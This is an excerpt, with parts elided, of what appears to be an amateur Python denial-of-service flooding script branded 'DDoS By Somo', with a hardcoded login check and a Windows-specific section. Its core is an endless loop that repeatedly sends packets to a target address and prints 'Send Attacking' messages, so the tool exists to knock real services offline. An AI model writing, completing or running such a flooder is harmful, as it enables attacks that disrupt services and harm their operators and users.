...
os.system("clear")
os.system("None")
print("\033[32m DDoS By Somo Is Loding ")
time.sleep(2)
print("Loading...")
os.system("clear")
...
while attemps < 100:
    ...
    if username == 'The 999' and password == 'The 999':
        print('Welcome Somo!!')
        break
    else:
...
if platform.system() == 'Windows':
	...
	print("""
 DDos By Somo is Presenting to you :
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Send Attacking By Somo !!!")
		except:
			print("[!]SOMO YNIK KOLL!!")
